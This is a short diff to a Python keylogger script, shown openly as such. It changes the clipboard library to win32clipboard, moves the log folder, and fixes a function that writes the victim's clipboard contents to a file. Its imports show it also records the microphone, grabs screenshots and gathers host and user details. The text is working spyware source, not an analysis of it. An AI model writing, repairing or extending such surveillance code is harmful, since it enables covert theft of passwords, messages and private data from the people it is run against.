@@ -1,5 +1,5 @@
 # importing import libraries-------------------------------------------
-import os, time, socket, platform, clipboard, getpass
+import os, time, socket, platform, win32clipboard, getpass
 import sounddevice as sd
 from requests import get
 from PIL import ImageGrab
@@ -37,7 +37,7 @@ key = ""
 
 ''' Enter the file path where your files will be stored. '''
 
-file_path = "D:\\Projects\\keylogger"
+file_path = "D:\\Projects\\keylogger\\logs"
 
 extend = "\\"
 file_merge = file_path + extend
@@ -68,9 +68,9 @@ computer_information()
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
-            clipboard.OpenClipboard()
-            pasted_data = clipboard.GetClipboardData()
-            clipboard.CloseClipboard()
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
 
             f.write("Clipboard Data: \n" + pasted_data)
 
